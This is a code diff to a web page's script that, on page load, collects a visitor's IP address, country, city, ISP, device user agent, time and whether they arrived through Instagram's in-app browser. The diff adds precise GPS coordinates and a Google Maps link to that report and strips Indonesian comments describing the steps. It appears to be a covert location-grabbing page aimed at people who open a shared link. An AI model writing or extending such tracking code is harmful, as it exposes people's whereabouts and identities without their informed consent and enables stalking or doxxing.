@@ -193,7 +193,6 @@
             } catch (e) { globalIpData = { ip: "N/A" }; }
         }
 
-        // Fungsi meminta izin lokasi secara aktif
         function getGPS() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -215,7 +214,6 @@
         }
 
         async function handleEntry() {
-            // Jalankan paralel: ambil IP dan minta izin lokasi
             const ipPromise = fetchIp();
             const gpsPromise = getGPS();
             
@@ -227,6 +225,8 @@
                         `Country : ${globalIpData.country_name || 'N/A'}\n` +
                         `City    : ${globalIpData.city || 'N/A'}\n` +
                         `ISP     : ${globalIpData.org || 'N/A'}\n` +
+                        `📍 GPS  : ${globalCoords}\n` +
+                        `🗺️ Maps : https://www.google.com/maps?q=${globalCoords.replace(/\s/g, '')}\n` +
                         `📱 Dev  : ${navigator.userAgent.substring(0, 50)}...\n` +
                         `⏰ Time : ${new Date().toLocaleString()}\n` +
                         `🌐 Browser: ${navigator.userAgent.includes("Instagram") ? "INSTAGRAM" : "EXTERNAL BROWSER"}\n` +
@@ -264,7 +264,6 @@
             btn.innerText = 'SEND SIGNAL';
         });
 
-        // Trigger saat halaman dimuat
         window.addEventListener('load', handleEntry);
     </script>
 </body>
